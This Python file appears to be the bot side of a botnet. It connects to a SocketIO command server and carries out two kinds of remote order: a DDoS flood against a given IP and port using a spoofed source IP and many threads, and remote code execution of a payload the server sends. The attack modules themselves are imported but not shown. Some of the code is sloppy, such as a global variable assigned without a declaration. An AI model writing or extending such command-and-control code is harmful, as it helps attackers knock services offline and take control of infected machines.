from commands.rce import CommandRCE
from commands.ddos import CommandDDoS
from commands.command import Command, CommandType
import socketio

socket_client = socketio.Client()

running_command: Command = None

def start_server() -> None:
    socket_client.connect("ws://localhost:5000")

# SocketIO event definitions
@socket_client.event
def connect():
    print('Connected to SocketIO server')

@socket_client.event
def connect_error(data):
    print("Failed to connect to SocketIO server")
    print(data)

@socket_client.event
def disconnect():
    print("Disconnected from SocketIO server")

@socket_client.on('command')
def on_command(data):
    command: Command = None
    print(type(CommandType.DDoS))
    print(type(data['type']))
    if data['type'] == CommandType.DDoS:
        command = CommandDDoS(data['target_ip'], data['target_port'], data['fake_ip'], data['nb_threads'])
    elif data['type'] == CommandType.RCE:
        command = CommandRCE(data['payload'])

    if command is not None:
        running_command = command
        running_command.process()
    else:
        print('Error, command {} does not exists'.format(data['type']))

@socket_client.on('stop')
def on_stop():
    if running_command is not None:
        running_command.stop()